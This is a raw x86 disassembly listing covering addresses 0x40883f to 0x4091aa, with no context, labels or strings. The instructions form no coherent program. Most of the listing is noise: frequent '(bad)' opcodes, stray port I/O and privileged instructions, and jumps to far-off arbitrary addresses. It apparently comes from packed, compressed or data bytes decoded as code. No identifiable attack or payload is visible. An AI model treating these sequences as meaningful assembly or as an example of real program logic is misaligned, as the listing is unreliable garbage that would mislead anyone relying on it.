  40883f:	add    BYTE PTR [edx+0x0],al
  408842:	sub    DWORD PTR [eax],ecx
  408844:	mov    esp,0x3903e987
  408849:	aas    
  40884a:	lods   al,BYTE PTR ds:[esi]
  40884b:	cmp    edi,DWORD PTR [ecx]
  40884d:	add    cl,ch
  40884f:	add    esi,esi
  408851:	mov    esp,0x3e37fc
  408856:	jmp    0xe8e9a708
  40885b:	lods   eax,DWORD PTR ds:[esi]
  40885c:	push   ss
  40885d:	test   eax,0x2c7486e8
  408862:	cmp    DWORD PTR [ecx+0x37d62bbc],ecx
	...
  40887c:	dec    bh
  40887e:	aad    0xb1
  408880:	out    dx,al
  408881:	ss push esp
  408883:	cmp    cl,ah
  408885:	xor    al,0x43
  408887:	add    al,0x39
  408889:	or     ebp,DWORD PTR [ecx+0x1c2b38b0]
  40888f:	mov    DWORD PTR [ebx+eiz*1-0x3031c84a],edi
  408896:	jae    0x408819
  408898:	int    0x2e
  40889a:	sahf   
  40889b:	aaa    
  40889c:	imul   esi,DWORD PTR [edi],0xacb6141c
  4088a2:	fsubr  QWORD PTR [ebx]
  4088a4:	das    
  4088a5:	imul   eax,DWORD PTR [esi+0x797cb037],0x2f
  4088ac:	sahf   
  4088ad:	ss loop 0x4088f3
  4088b0:	or     eax,0x9d7969e2
  4088b5:	cs data16 aaa 
  4088b8:	cmp    DWORD PTR [edi+edi*8+0x46367eab],ebp
  4088bf:	jbe    0x408937
  4088c1:	ins    BYTE PTR es:[edi],dx
  4088c2:	cmp    eax,0x46366e2f
  4088c7:	jno    0x408932
  4088c9:	cs ds aaa 
  4088cc:	pop    esi
  4088cd:	lods   al,BYTE PTR ds:[esi]
  4088ce:	jmp    eax
  4088d0:	and    al,BYTE PTR [edi-0x37]
  4088d3:	cs push es
  4088d5:	aaa    
  4088d6:	mov    ch,0x19
  4088d8:	push   ss
  4088d9:	aaa    
  4088da:	call   DWORD PTR [ecx]
  4088dc:	push   esi
  4088dd:	pop    esi
  4088de:	call   DWORD PTR [esi]
	...
  4088f4:	outs   dx,BYTE PTR ds:[esi]
  4088f5:	mov    ebx,0x35b502f7
  4088fa:	jne    0x408901
  4088fc:	push   ebp
  4088fd:	mov    ah,0x79
  4088ff:	jmp    0xe602d03e
  408904:	cmp    cl,bl
  408906:	mov    bh,ch
  408908:	mov    ebx,0x3d53fc3c
  40890d:	stos   BYTE PTR es:[edi],al
  40890e:	pop    ss
  40890f:	fmulp  st(1),st
  408911:	std    
  408912:	out    0x2d,eax
  408914:	pop    eax
  408915:	xor    eax,0x39f960ff
  40891a:	push   0xffc0e0e9
  40891f:	mov    ebp,0x2828ace9
  408924:	cmp    eax,0x22e17535
  408929:	(bad)  
  40892b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40892c:	push   gs
  40892e:	jmp    edx
  408930:	cmc    
  408931:	xor    eax,0x3aeb67
  408936:	or     BYTE PTR [esi-0x25180217],0x6f
  40893d:	xor    eax,0xfa3c11ff
  408942:	inc    eax
  408943:	jmp    0xc0b57497
  408948:	jne    0x40897f
  40894a:	(bad)  
  40894b:	fdiv   QWORD PTR [edx]
  40894d:	sub    BYTE PTR [eax],al
  40894f:	pop    esi
  408950:	inc    edi
  408951:	xor    eax,0xc070f068
  408956:	inc    eax
	...
  40896c:	cmp    BYTE PTR [eax],al
  40896e:	add    BYTE PTR [eax],al
  408970:	shr    ch,1
  408972:	je     0x40897c
  408974:	or     bl,bl
  408976:	std    
  408977:	dec    DWORD PTR [edi]
  408979:	out    dx,al
  40897a:	je     0x408978
  40897c:	pop    ds
  40897d:	jo     0x408986
  40897f:	call   0x3f29e6
  408984:	or     DWORD PTR [edi-0x760afffd],edi
  40898a:	in     al,dx
  40898b:	inc    ebp
  40898d:	cld    
  40898e:	out    0xf4,eax
  408990:	mov    ebp,esi
  408992:	dec    BYTE PTR [ebx]
  408994:	push   eax
  408995:	cmp    BYTE PTR gs:[eax-0x1a],ch
  408999:	ss inc eax
  40899b:	add    BYTE PTR [eax+0x1fab88e8],dh
  4089a1:	jmp    0x4089f2
  4089a3:	push   eax
  4089a4:	push   0xceeefffc
  4089a9:	arpl   WORD PTR [ebx],di
  4089ab:	cmp    ah,BYTE PTR [ecx]
  4089ad:	cld    
  4089ae:	dec    edi
  4089af:	jmp    DWORD PTR ds:0x8c50e804
  4089b5:	jmp    0xef00:0x17858fe
  4089bc:	pop    esi
  4089bd:	fs inc eax
  4089bf:	cmp    dl,BYTE PTR [ecx]
  4089c1:	cld    
  4089c2:	dec    edi
  4089c3:	jmp    DWORD PTR ds:0xdc3ce804
  4089c9:	jmp    0xfffe:0xd338e8fe
	...
  4089e4:	jmp    0x454091aa
  4089e9:	xchg   esp,ebp
  4089eb:	and    esp,0xfffffff7
  4089ee:	imul   eax,DWORD PTR [eax],0x75ff193a
  4089f4:	mov    al,ch
  4089f6:	mov    DWORD PTR [edi+ebx*8+0x394588ea],esp
  4089fd:	retf   
  4089fe:	test   eax,0xb4b6e19
  408a03:	call   0xff7547d4
  408a08:	ror    DWORD PTR [ecx],cl
  408a0a:	xor    eax,0x88bf4175
  408a0f:	dec    DWORD PTR [esi-0x1b]
  408a12:	test   eax,0xb93461b
  408a17:	call   0xff759fd4
  408a1c:	ss xchg ebp,eax
  408a1e:	aaa    
  408a1f:	jmp    DWORD PTR [ecx+eiz*1-0x5225bd5]
  408a26:	xor    al,0xc9
  408a28:	sti    
  408a29:	sbb    eax,0xfdc25503
  408a2e:	add    ah,0xd
  408a31:	and    ebp,DWORD PTR [esi+0x68c7110b]
  408a37:	(bad)  
  408a38:	(bad)  
  408a39:	cs inc ebx
  408a3b:	bsr    eax,DWORD PTR [esi-0x5fc6fffd]
  408a42:	mov    ebp,0x13bcbafb
	...
  408a5b:	add    BYTE PTR [ebp+0x23],ah
  408a5e:	xor    al,0x75
  408a60:	sub    DWORD PTR [edx-0x52],ebp
  408a63:	sti    
  408a64:	loope  0x408aa4
  408a66:	imul   edi,edi,0xfbbdb0c6
  408a6c:	push   ecx
  408a6d:	or     dl,bh
  408a6f:	inc    eax
  408a70:	cmp    DWORD PTR [edx-0x655e0452],ecx
  408a76:	push   0xac19a6ff
  408a7b:	call   FWORD PTR [esi-0x69af8a7e]
  408a81:	xor    al,0xb
  408a83:	call   0xff74ec02
  408a88:	xchg   ecx,eax
  408a89:	add    BYTE PTR ds:0xd1337e5d,bh
  408a8f:	test   BYTE PTR [ebx],dh
  408a91:	shr    eax,0x34
  408a94:	in     al,0x33
  408a96:	inc    ecx
  408a97:	popf   
  408a98:	nop
  408a99:	xor    eax,DWORD PTR [esi-0x2d]
  408a9c:	(bad)  
  408a9d:	add    cl,ch
  408a9f:	and    al,0x97
  408aa1:	shl    BYTE PTR ds:0x8b2836ae,1
  408aa7:	dec    ebx
  408aa8:	inc    esi
  408aa9:	xor    edx,DWORD PTR [ecx]
  408aab:	jo     0x408a44
  408aad:	xor    ebx,DWORD PTR [esi]
  408aaf:	stos   DWORD PTR es:[edi],eax
  408ab0:	lods   eax,DWORD PTR ds:[esi]
  408ab1:	mul    BYTE PTR [edi+0xcad2e03]
  408ab7:	sub    edi,DWORD PTR [esi+eiz*2+0x6]
  408abb:	xor    al,0x89
  408abd:	test   al,0xe8
  408abf:	add    eax,DWORD PTR [eax]
	...
  408ad1:	add    BYTE PTR [eax],al
  408ad3:	add    BYTE PTR [esi],ah
  408ad5:	jb     0x408a70
  408ad7:	xor    al,0x84
  408ad9:	or     BYTE PTR [ecx],al
  408adb:	xor    cl,0x32
  408ade:	out    0x1c,al
  408ae0:	stos   DWORD PTR es:[edi],eax
  408ae1:	pop    ecx
  408ae2:	fidiv  WORD PTR [ebx]
  408ae4:	popa   
  408ae5:	pop    edx
  408ae6:	adc    eax,ebp
  408ae8:	out    dx,al
  408ae9:	xor    DWORD PTR [eax+esi*1-0x2f],edx
  408aed:	fist   DWORD PTR [edx+0x50cfde33]
  408af3:	add    eax,0xd4772339
  408af8:	iret   
  408af9:	lods   al,BYTE PTR ds:[esi]
  408afa:	loopne 0x408b17
  408afc:	pop    ecx
  408afd:	dec    eax
  408afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aff:	xor    edx,ecx
  408b01:	mov    al,0x46
  408b03:	xor    esi,DWORD PTR [esi-0x5ecfe3ce]
  408b09:	test   al,0x46
  408b0b:	xor    esp,DWORD PTR [esi+0x3900ab48]
  408b11:	int    0x71
  408b13:	and    BYTE PTR [edx-0x508affc5],bh
  408b19:	xor    ch,BYTE PTR [ecx-0x2d]
  408b1c:	dec    ebx
  408b1d:	lods   eax,DWORD PTR ds:[esi]
  408b1e:	pop    es
  408b1f:	push   ecx
  408b20:	(bad)  
  408b21:	pop    esi
  408b22:	call   FWORD PTR [esi-0xc]
  408b25:	mov    esp,0xa63ac3fb
  408b2a:	sbb    DWORD PTR [esi-0x60],ecx
  408b2d:	cli    
  408b2e:	out    0xb,eax
  408b30:	sub    dh,BYTE PTR [ebx]
  408b32:	call   ebx
  408b34:	cmp    ah,BYTE PTR [esi+0x3622]
	...
  408b4a:	add    BYTE PTR [eax],al
  408b4c:	nop
  408b4d:	cli    
  408b4e:	out    0xd7,eax
  408b50:	or     esi,DWORD PTR [ebx]
  408b52:	call   DWORD PTR [ebx+0x1e1ba63a]
  408b58:	lock stc 
  408b5a:	out    0xe3,eax
  408b5c:	imul   esi,DWORD PTR [ecx],0xffffffff
  408b5f:	cmp    DWORD PTR [edi-0xa],0x17bce940
  408b66:	push   DWORD PTR [edx+edx*1+0x1a]
  408b6a:	sti    
  408b6b:	test   DWORD PTR [ebx+0x31],0xc1172a68
  408b72:	call   DWORD PTR [edx+0x16]
  408b75:	xor    esi,DWORD PTR [ebp-0xf]
  408b78:	push   edx
  408b79:	and    al,0xfe
  408b7b:	(bad)  
  408b7c:	sub    ebp,DWORD PTR [eax+0x31fc13c2]
  408b82:	imul   esp,ebp,0xd107ab2b
  408b88:	imul   esi,DWORD PTR [edx],0xab0bb6ff
  408b8e:	sti    
  408b8f:	scas   al,BYTE PTR es:[edi]
  408b90:	cmp    ecx,0x31561be7
  408b96:	push   DWORD PTR [eax+0x3bfffbfc]
  408b9c:	cs and al,0x81
  408b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba0:	inc    edx
  408ba1:	sub    edi,edi
  408ba3:	add    BYTE PTR [edi+0x30fc4580],dh
  408ba9:	in     eax,dx
  408baa:	je     0x408bbc
  408bac:	pop    es
  408bad:	js     0x408bba
  408baf:	call   0x408bb4
	...
  408bc4:	enter  0xff65,0xff
  408bc8:	mov    edi,DWORD PTR [ebp-0x3607af2]
  408bce:	(bad)  
  408bcf:	call   FWORD PTR [edi]
  408bd1:	dec    eax
  408bd2:	test   DWORD PTR [eax],0xc6fffd50
  408bd8:	(bad)  
  408bd9:	jmp    0xfda093dc
  408bde:	imul   eax,DWORD PTR [eax],0x69fd7a
  408be4:	jp     0x408be3
  408be6:	mov    WORD PTR [ebp+0x1c],es
  408be9:	dec    ebp
  408bea:	mov    WORD PTR [ebp-0x109b4],es
  408bf0:	lock in eax,dx
  408bf2:	je     0x408bec
  408bf4:	aaa    
  408bf5:	js     0x408bf2
  408bf7:	call   0x3ff126
  408bfc:	or     edi,DWORD PTR [ebp+0x33390573]
  408c02:	add    BYTE PTR [eax],al
  408c04:	adc    BYTE PTR [ebp-0x3aed71b],dl
  408c0a:	(bad)  
  408c0b:	jne    0x408bfd
  408c0d:	adc    al,0x2d
  408c0f:	test   eax,0x8b4fef07
  408c14:	mov    al,ds:0x9ff484b0
  408c19:	out    dx,al
  408c1a:	(bad)  
  408c1b:	push   eax
  408c1c:	xor    dl,BYTE PTR [ebx*1-0x77117857]
  408c23:	test   DWORD PTR [eax+0xfffef6],eax
	...
  408c39:	add    BYTE PTR [eax],al
  408c3b:	add    BYTE PTR [eax-0x28005b96],ch
  408c41:	xchg   ecx,eax
  408c42:	jmp    DWORD PTR [edi+0x39]
  408c45:	inc    ebp
  408c46:	in     al,dx
  408c47:	inc    eax
  408c48:	cmp    DWORD PTR [edx+0x79a6f077],eax
  408c4e:	xor    edi,edi
  408c50:	or     al,0x23
  408c52:	sbb    esi,DWORD PTR [esi-0x1f]
  408c55:	test   eax,0xb2bc8930
  408c5a:	cmp    bh,bh
  408c5c:	jle    0x408caa
  408c5e:	add    ebp,DWORD PTR [eax+0x27]
  408c61:	faddp  st(2),st
  408c63:	jmp    FWORD PTR [edi-0x6d]
  408c66:	xor    al,0xf7
  408c68:	shl    WORD PTR [eax],0x75
  408c6c:	sub    eax,0x56a7cccf
  408c71:	icebp  
  408c72:	jp     0x408bf9
  408c74:	popa   
  408c75:	icebp  
  408c76:	xor    bh,bh
  408c78:	mov    edx,0x3ef71fa3
  408c7d:	fld    DWORD PTR [ebx]
  408c7f:	je     0x408cea
  408c81:	xchg   ecx,eax
  408c82:	add    eax,DWORD PTR [eax]
  408c84:	push   ds
  408c85:	fcomp  DWORD PTR [ebx+0x35863e9]
  408c8b:	jmp    esp
  408c8d:	adc    eax,0x2f16ff39
  408c92:	mov    dh,0x7
  408c94:	and    DWORD PTR [ebx],eax
  408c96:	cmp    edi,edi
  408c98:	push   es
  408c99:	add    BYTE PTR [edx],0x0
  408c9c:	push   cs
  408c9d:	push   0xf39b
	...
  408cb2:	add    BYTE PTR [eax],al
  408cb4:	xor    ebx,eax
  408cb6:	add    edi,edi
  408cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb9:	inc    ebp
  408cba:	cmp    bh,bh
  408cbc:	out    0x3e,al
  408cbe:	mov    dh,0x7
  408cc0:	ror    DWORD PTR [edx-0x652900c6],1
  408cc6:	ins    DWORD PTR es:[edi],dx
  408cc7:	call   0x710392
  408ccc:	dec    ebp
  408ccd:	sub    DWORD PTR [ebx-0x69ff4101],ebx
  408cd3:	jno    0x408cf6
  408cd5:	sbb    ah,bl
  408cd7:	ret    0x2eae
  408cda:	pop    esp
  408cdb:	sbb    ebp,DWORD PTR [esi+0x24308e2f]
  408ce1:	clc    
  408ce2:	nop
  408ce3:	jne    0x408c65
  408ce5:	das    
  408ce6:	jle    0x408c83
  408ce8:	cmp    DWORD PTR [eax],eax
  408cea:	xchg   BYTE PTR [ecx+0x11],dh
  408ced:	xor    al,0xb3
  408cef:	ret    0x2e7e
  408cf2:	pushf  
  408cf3:	sbb    ebp,DWORD PTR [esi+0x2f]
  408cf6:	pop    esi
  408cf7:	xor    ah,ah
  408cf9:	test   DWORD PTR [eax-0x73],0x304e2f70
  408d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d01:	sbb    al,0x3e
  408d03:	xor    BYTE PTR [esi+0x18],dl
  408d06:	sub    DWORD PTR [edi+0x4e],esp
  408d09:	das    
  408d0a:	ss jbe 0x408d5e
  408d0d:	aaa    
  408d0e:	xor    BYTE PTR cs:[ecx+0x75],dl
  408d12:	dec    ebp
  408d13:	xor    BYTE PTR [esi],dh
  408d15:	das    
  408d16:	push   esp
  408d17:	xor    eax,DWORD PTR [eax]
	...
  408d29:	add    BYTE PTR [eax],al
  408d2b:	add    BYTE PTR [esi],ah
  408d2d:	das    
  408d2e:	push   ss
  408d2f:	xor    BYTE PTR [esp+edi*8+0x1836b60d],ch
  408d36:	cmp    eax,0xfe2f1631
  408d3b:	jne    0x408d46
  408d3d:	aaa    
  408d3e:	imul   BYTE PTR [edi]
  408d40:	adc    DWORD PTR [ecx+0x2efe3045],ecx
  408d46:	sub    al,0x2c
  408d48:	loopne 0x408d81
  408d4a:	fild   QWORD PTR [edi]
  408d4c:	out    dx,al
  408d4d:	cs pop esp
  408d4f:	xor    cl,dl
  408d51:	and    dl,BYTE PTR [edi+0x4]
  408d54:	cmp    DWORD PTR [ecx],edi
  408d56:	stos   DWORD PTR es:[edi],eax
  408d57:	add    BYTE PTR [ecx],bh
  408d59:	aad    0x71
  408d5b:	and    dh,cl
  408d5d:	mov    ah,0xff
  408d5f:	in     al,0x22
  408d61:	cmp    DWORD PTR [eax-0x4004f152],ebp
  408d67:	sbb    eax,0xe3fda6a4
  408d6c:	jne    0x408d9c
  408d6e:	dec    edi
  408d6f:	xor    DWORD PTR [edi+0x66],0xbe858eff
  408d76:	addr16 jmp 0x11feacb6
  408d7c:	xor    ebp,edx
  408d7e:	inc    eax
  408d7f:	jmp    0xe1b5baee
  408d84:	and    ah,ch
  408d86:	enter  0x2666,0xc8
  408d8a:	addr16 call 0xc1feacca
	...
  408da4:	cs jmp 0xf175:0x2d8ae940
  408dac:	xor    dl,BYTE PTR [ecx]
  408dae:	leave  
  408daf:	ds push ds
  408db1:	sbb    BYTE PTR ds:0xc92f168d,bh
  408db7:	sub    edi,DWORD PTR ds:0x5972542e
  408dbd:	add    esp,0x69d7071d
  408dc3:	jmp    0x953f9888
  408dc8:	and    ah,BYTE PTR [esi]
  408dca:	pop    ebp
  408dcb:	dec    eax
  408dcc:	sub    ax,0xa489
  408dd0:	pop    esi
  408dd1:	jns    0x408e08
  408dd3:	addr16 in eax,0xc0
  408dd6:	jmp    DWORD PTR [ecx+0x8]
  408dd9:	nop
  408dda:	sub    BYTE PTR [eax],ch
  408ddc:	cmp    eax,0xefe93f80
  408de1:	cmp    DWORD PTR [ebx+0x68003ae9],0xffc0d0ae
  408deb:	push   DWORD PTR [esi]
  408ded:	or     al,0xb0
  408def:	jbe    0x408dd1
  408df1:	add    DWORD PTR [ebx],ecx
  408df3:	rol    BYTE PTR [esi+ebp*2],0x3f
  408df7:	or     al,0x1
  408dfa:	je     0x408f27
  408e00:	jo     0x408d8e
  408e02:	fidivr WORD PTR [edx]
  408e04:	push   ecx
  408e05:	add    al,0xe8
  408e07:	in     eax,dx
	...
  408e1c:	inc    esp
  408e1d:	add    al,0x0
  408e1f:	pop    edx
  408e20:	mov    ds:0xe9e84fbf,eax
  408e25:	lahf   
  408e26:	(bad)  
  408e27:	jmp    DWORD PTR [eax]
  408e29:	push   esp
  408e2a:	add    BYTE PTR [bx+si-0x41f2],dl
  408e2f:	push   0x40170a
  408e34:	mov    al,0xde
  408e36:	je     0x408e40
  408e38:	clc    
  408e39:	jbe    0x408e03
  408e3b:	(bad)  
  408e3c:	out    dx,eax
  408e3d:	cmp    BYTE PTR [edi+0x1],ah
  408e40:	pusha  
  408e41:	push   cs
  408e42:	mov    esi,0x40170468
  408e47:	add    BYTE PTR [eax-0x7f78b22],ah
  408e4d:	or     al,0xff
  408e50:	pop    edi
  408e51:	or     DWORD PTR [edx-0x1521b05d],esi
  408e57:	inc    ebx
  408e58:	mov    eax,0x104139d5
  408e5d:	push   esi
  408e5e:	out    0x41,eax
  408e60:	xchg   esi,eax
  408e61:	add    DWORD PTR [eax],eax
  408e63:	or     esp,DWORD PTR [eax+0x75]
  408e66:	xor    edx,DWORD PTR [esi+0x38]
  408e69:	lods   al,BYTE PTR gs:[esi]
  408e6b:	dec    DWORD PTR [edi]
  408e6d:	push   edx
  408e6e:	dec    edi
  408e6f:	push   0xbeef00e0
  408e74:	mov    BYTE PTR [edx],cl
  408e76:	cmp    al,BYTE PTR [ecx+0x39]
  408e79:	pop    ss
  408e7a:	sar    esi,cl
  408e7c:	fs pop ds
  408e7e:	sbb    edx,DWORD PTR [ebp+0x0]
	...
  408e91:	add    BYTE PTR [eax],al
  408e93:	add    BYTE PTR [ecx],al
  408e95:	inc    esi
  408e96:	sub    eax,0x3186158
  408e9b:	out    dx,eax
  408e9c:	xchg   DWORD PTR [esi+0x17783a37],edi
  408ea2:	sar    esi,cl
  408ea4:	sub    al,0x2f
  408ea6:	sbb    eax,DWORD PTR [ecx-0x7f]
  408ea9:	lea    ebp,ds:0x2cba14e8
  408eaf:	call   DWORD PTR [edx+0x577fc517]
  408eb5:	pop    ss
  408eb6:	mov    dh,0xf9
  408eb8:	imul   DWORD PTR [edx-0x4a3f4010]
  408ebe:	sub    al,0xff
  408ec0:	jle    0x408e6a
  408ec2:	pop    ebp
  408ec3:	cmp    BYTE PTR [esi],bh
  408ec5:	xchg   BYTE PTR ss:[ebp+0x6e],al
  408ec9:	int    0x2c
  408ecb:	push   0x43
  408ecd:	(bad)  
  408ece:	mov    dh,0x7
  408ed0:	push   ecx
  408ed1:	fldcw  WORD PTR ds:0xe05056ff
  408ed7:	inc    ah
  408ed9:	sbb    edi,DWORD PTR cs:[ecx+0x6a2cf547]
  408ee0:	sbb    eax,0x2107b6de
  408ee5:	shr    DWORD PTR ds:0x13922eff,cl
  408eeb:	cmp    edi,DWORD PTR [eax+0x19]
  408eee:	sub    al,0x35
  408ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef1:	inc    eax
  408ef2:	ret    0x17ff
  408ef5:	lods   eax,DWORD PTR ds:[esi]
  408ef6:	cli    
  408ef7:	out    0x0,eax
	...
  408f09:	add    BYTE PTR [eax],al
  408f0b:	add    BYTE PTR [eax+0x2c],cl
  408f0e:	sub    al,0xff
  408f10:	xchg   ecx,eax
  408f11:	dec    ecx
  408f12:	call   0x1c1c857
  408f17:	add    BYTE PTR [ecx],bh
  408f19:	add    BYTE PTR [ecx+0x2c],ch
  408f1c:	fs clc 
  408f1e:	ror    BYTE PTR [esp+eiz*8],1
  408f21:	sub    edx,esi
  408f23:	sub    al,0x64
  408f25:	sub    al,0xce
  408f27:	mov    dh,0x3e
  408f29:	sbb    BYTE PTR [ebx+0x63],ch
  408f2c:	into   
  408f2d:	sub    ebx,DWORD PTR [esi]
  408f2f:	into   
  408f30:	icebp  
  408f31:	ds in  eax,dx
  408f33:	add    esp,DWORD PTR [edi+esi*2-0x43]
  408f37:	cmp    BYTE PTR [ebp+0x50],0x9e
  408f3b:	sub    al,0xae
  408f3d:	jge    0x408f63
  408f3f:	xor    BYTE PTR [ecx],cl
  408f41:	sub    ebx,DWORD PTR [esp+edx*1]
  408f44:	sahf   
  408f45:	mov    ch,0xdc
  408f47:	sbb    edi,edi
  408f49:	mov    ah,0xe8
  408f4b:	add    eax,DWORD PTR [edx+0x40]
  408f4e:	out    dx,al
  408f4f:	xchg   bl,bh
  408f51:	std    
  408f52:	call   0x7106055a
  408f57:	add    edi,DWORD PTR [ecx]
  408f59:	add    cl,ch
  408f5b:	inc    esp
  408f5c:	hlt    
  408f5d:	xor    ebx,DWORD PTR [esi+0x4]
  408f60:	cmp    DWORD PTR [eax],eax
  408f62:	ret    
  408f63:	add    edx,ebx
  408f65:	inc    edx
  408f67:	add    esp,ebx
  408f69:	push   DWORD PTR [ebx-0x3a]
  408f6c:	dec    edx
  408f6d:	shr    BYTE PTR [ebx-0x7a],1
	...
  408f84:	dec    ebp
  408f85:	xor    esi,DWORD PTR [esi]
  408f87:	sub    al,0xe9
  408f89:	sub    dh,BYTE PTR [ebx+ebp*1+0x1b24b536]
  408f90:	push   ecx
  408f91:	mov    ch,0xe8
  408f93:	add    esi,DWORD PTR [edx]
  408f95:	inc    eax
  408f96:	popf   
  408f97:	push   es
  408f98:	adc    BYTE PTR ds:0x983903eb,al
  408f9e:	push   cs
  408f9f:	fstp   TBYTE PTR [ecx+0x0]
  408fa2:	(bad)  
  408fa3:	mov    ch,0x36
  408fa5:	sbb    BYTE PTR [eax],al
  408fa7:	mov    dl,0x94
  408fa9:	sub    edi,edi
  408fab:	cdq    
  408fac:	jno    0x408ffe
  408fae:	lea    ebp,[ecx+ebp*1+0x33]
  408fb2:	(bad)  
  408fb3:	fimul  WORD PTR ds:0x5b02e7d1
  408fb9:	sub    edi,edi
  408fbb:	pusha  
  408fbc:	mov    eax,0x22c6f72f
  408fc1:	sbb    BYTE PTR [ecx+0x6a2b128b],al
  408fc7:	jmp    0x287b846e
  408fcc:	cmp    eax,0x6a99b52b
  408fd1:	sub    edi,edi
  408fd3:	sahf   
  408fd4:	call   0x18ae77cf
  408fd9:	sub    edi,edi
  408fdb:	pusha  
  408fdc:	mov    eax,0x6286f723
  408fe1:	xchg   esi,eax
  408fe2:	call   DWORD PTR [eax]
  408fe4:	xchg   edx,eax
  408fe5:	in     eax,0x40
  408fe7:	jmp    0x408fec
	...
  408ffc:	push   ebx
  408ffd:	jne    0x408fef
  408fff:	jbe    0x409023
  409001:	sub    edi,edi
  409003:	fsub   QWORD PTR [esi+0x22]
  409006:	imul   eax,DWORD PTR [edx+edx*1+0x416c892b],0xb74eff33
  409011:	sub    ah,BYTE PTR [edi-0x4f]
  409014:	pop    edi
  409015:	mov    edi,0x2fc83dff
  40901a:	div    DWORD PTR [esi]
  40901c:	adc    ch,BYTE PTR [ebx]
  40901e:	jne    0x408ffd
  409020:	push   edx
  409021:	mov    edx,0x776226a4
  409026:	test   DWORD PTR [ecx],edx
  409028:	push   0x29
  40902a:	inc    DWORD PTR [ebx-0x2daf67c6]
  409030:	std    
  409031:	sub    esi,edi
  409033:	add    BYTE PTR [ebp-0xc],cl
  409036:	idiv   bh
  409038:	pop    es
  409039:	xlat   BYTE PTR ds:[ebx]
  40903a:	je     0x409048
  40903c:	cmp    BYTE PTR [ecx],dh
  40903e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40903f:	jmp    edi
  409041:	lods   al,BYTE PTR ds:[esi]
  409042:	test   ah,bl
  409044:	pmovmskb edi,mm6
  409047:	lea    ebx,[ebp-0x23]
  40904a:	idiv   bh
  40904c:	pop    es
  40904d:	dec    esi
  40904e:	addr16 popa 
  409050:	sub    eax,DWORD PTR [ebx-0x1]
  409053:	dec    BYTE PTR [ebp-0x13]
  409056:	idiv   bh
  409058:	xchg   esi,edx
  40905a:	xor    al,0x75
  40905c:	cmp    DWORD PTR [ebx-0x1],eax
  40905f:	out    0x0,eax
	...
  409071:	add    BYTE PTR [eax],al
  409073:	add    BYTE PTR [eax-0x54000160],dl
  409079:	mov    ebp,0x98131973
  40907e:	fcomip st,st(7)
  409080:	(bad)  
  409081:	(bad)  
  409082:	add    esi,DWORD PTR [ebp-0x70]
  409085:	(bad)  
  409086:	das    
  409087:	(bad)  
  409088:	sbb    eax,0x7fff6b5
  40908d:	dec    ebp
  40908e:	out    0xdd,eax
  409090:	icebp  
  409091:	aad    0xfe
  409093:	jmp    0x409021
  409095:	sub    bh,BYTE PTR [edi-0x18b2a18c]
  40909b:	shl    DWORD PTR [ecx-0x3238012a],1
  4090a1:	mov    ah,0xf6
  4090a3:	inc    DWORD PTR [edi]
  4090a5:	adc    BYTE PTR [eax],al
  4090a7:	add    BYTE PTR [eax-0x58],ah
  4090aa:	test   al,dl
  4090ac:	(bad)  
  4090ae:	(bad)  
  4090af:	push   eax
  4090b0:	js     0x409043
  4090b2:	cmp    al,BYTE PTR [ecx+0x20]
  4090b5:	(bad)  
  4090b6:	mov    ah,0xf0
  4090b8:	dec    edi
  4090b9:	(bad)  
  4090ba:	(bad)  
  4090bb:	dec    ebp
  4090bd:	xor    bh,ah
  4090bf:	lds    edi,FWORD PTR [ecx]
  4090c1:	mov    ebx,0xa3c0ff29
  4090c6:	dec    esi
  4090c7:	test   DWORD PTR [esi],0x1dbd8602
  4090cd:	xor    ch,BYTE PTR [ecx]
  4090cf:	(bad)  
  4090d0:	cmp    DWORD PTR [edx],esp
  4090d2:	jg     0x40906f
  4090d4:	cmp    DWORD PTR [edi],edx
  4090d6:	add    eax,DWORD PTR [ebx+0x0]
	...
  4090ec:	lods   al,BYTE PTR ds:[esi]
  4090ed:	push   edx
  4090ee:	xor    edi,edi
  4090f0:	out    0x16,al
  4090f2:	clc    
  4090f3:	sub    DWORD PTR [edi-0x45fffcea],0x7b
  4090fa:	sbb    al,0xf7
  4090fc:	into   
  4090fd:	inc    ecx
  4090fe:	add    al,0xf
  409100:	mov    ebp,0x39000397
  409105:	mov    edi,0x98a60013
  40910a:	sub    BYTE PTR [ebp+0x41],dh
  40910d:	vpmadcsswd ymm9,ymm4,ymm2,YMMWORD PTR [ecx-0x76724ad7]
  409117:	call   DWORD PTR [esi-0x161803ed]
  40911d:	mov    al,ds:0xf386ff28
  409122:	sbb    esi,edi
  409124:	jle    0x4090d7
  409126:	sub    BYTE PTR [ebp+0x41],dh
  409129:	jg     0x4090f1
  40912b:	popf   
  40912c:	outs   dx,BYTE PTR ds:[esi]
  40912d:	mov    eax,ds:0xd15db528
  409132:	sub    bh,bh
  409134:	pop    esi
  409135:	dec    ebx
  409136:	sti    
  409137:	out    0xd,eax
  409139:	cdq    
  40913a:	sub    bh,bh
  40913c:	dec    esi
  40913d:	stos   DWORD PTR es:[edi],eax
  40913e:	dec    ebx
  40913f:	test   DWORD PTR [esi-0x17],0xbf317528
  409146:	aas    
  409147:	popf   
  409148:	xlat   BYTE PTR ss:[ebx]
  40914a:	sub    BYTE PTR [ebp+0x291e010d],dh
	...
  409164:	sub    BYTE PTR es:[ebx+edi*8+0x29770916],dl
  40916c:	push   ss
  40916d:	test   BYTE PTR [eax+edx*2+0x6],cl
  409171:	sub    BYTE PTR [esi],al
  409173:	add    al,0x8d
  409175:	or     ebp,DWORD PTR [edx+0x67]
  409178:	jmp    0x3d6987ac
  40917d:	lods   eax,DWORD PTR ds:[esi]
  40917e:	fidivr DWORD PTR [esp+esi*4+0x4c]
  409182:	fisubr WORD PTR [eax]
  409184:	out    0x27,al
  409186:	sbb    DWORD PTR [ecx],ebp
  409188:	fs clc 
  40918a:	ror    BYTE PTR [edi+0x1cce27b4],0x43
  409191:	call   0x7bd0:0xf84c28e8
  409198:	pushf  
  409199:	daa    
  40919a:	mov    dh,0x28
  40919c:	in     al,dx
  40919d:	sbb    al,0xb6
  40919f:	sub    BYTE PTR [esi-0x599c62e8],ch
  4091a5:	daa    
  4091a6:	sahf   
  4091a7:	outs   dx,BYTE PTR ds:[esi]
  4091a8:	lea    ebp,[edi]
  4091aa:	xchg   esi,eax
